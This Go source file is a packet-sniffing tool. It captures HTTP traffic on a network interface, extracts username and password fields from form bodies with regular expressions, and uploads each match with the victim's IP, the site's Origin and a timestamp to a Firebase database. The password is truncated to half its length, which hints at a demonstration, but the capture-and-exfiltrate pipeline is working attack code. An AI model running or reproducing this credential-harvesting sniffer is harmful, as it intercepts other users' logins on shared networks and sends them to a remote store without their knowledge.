package main

import (
	"bufio"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"regexp"
	"time"

	"net/url"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket/tcpassembly"
	"github.com/google/gopacket/tcpassembly/tcpreader"
	"github.com/zabawaba99/firego"
)

var (
	reID = regexp.MustCompile(`(?i)` + `[^&]*(?:id|user|name)[^&]*=([^&]+)`)
	rePW = regexp.MustCompile(`(?i)` + `[^&]*(?:pass|pw)[^&]*=([^&]+)`)
)

type Row struct {
	TIMESTAMP, IP, URL, ID, PW string
}

// httpStreamFactory implements tcpassembly.StreamFactory
type httpStreamFactory struct{}

func (h *httpStreamFactory) New(a, _ gopacket.Flow) tcpassembly.Stream {
	r := tcpreader.NewReaderStream()
	go func() {
		buf := bufio.NewReader(&r)
		for {
			if req, err := http.ReadRequest(buf); err == io.EOF {
				return
			} else if err != nil {
				// log.Println("Error parsing HTTP requests:", err)
			} else {
				// http asemble finish.
				body, err := ioutil.ReadAll(req.Body)
				defer req.Body.Close()
				if err != nil {
					continue
				}
				if parsed := find(body); parsed != nil {
					URL := req.Header.Get("Origin")
					if URL == "" {
						continue
					}
					ID, _ := url.QueryUnescape(parsed[0])
					PW, _ := url.QueryUnescape(parsed[1])

					uploadToFirebase(&Row{
						time.Now().Format("2006-01-02 15:04:05"),
						a.Src().String(),
						URL,
						ID,
						PW,
					})
				}
			}
		}
	}()
	return &r
}

func uploadToFirebase(row *Row) {
	f := firego.New("https://ccit-matched-data.firebaseio.com", nil)
	_, err := f.Push(row)
	if err != nil {
		log.Fatal(err)
	}
}

func find(http []byte) []string {
	id := reID.FindSubmatch(http)
	pw := rePW.FindSubmatch(http)
	if len(id) == 2 && len(pw) == 2 {
		id, pw := string(id[1]), string(pw[1])
		pw = pw[:len(pw)/2] + "..."
		return []string{id, pw}
	}
	return nil
}

func parse(device pcap.Interface) {
	handle, err := pcap.OpenLive(device.Name, snapshotLen, promiscuous, timeout)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	streamFactory := &httpStreamFactory{}
	streamPool := tcpassembly.NewStreamPool(streamFactory)
	assembler := tcpassembly.NewAssembler(streamPool)

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	packets := packetSource.Packets()
	ticker := time.Tick(time.Minute)
	for {
		select {
		case packet := <-packets:
			if packet.NetworkLayer() == nil || packet.TransportLayer() == nil || packet.TransportLayer().LayerType() != layers.LayerTypeTCP {
				continue
			}
			tcp := packet.TransportLayer().(*layers.TCP)
			assembler.AssembleWithTimestamp(packet.NetworkLayer().NetworkFlow(), tcp, packet.Metadata().Timestamp)
		case <-ticker:
			// Every minute, flush connections that haven't seen activity in the past 2 minutes.
			assembler.FlushOlderThan(time.Now().Add(time.Minute * -2))
		}
	}
}
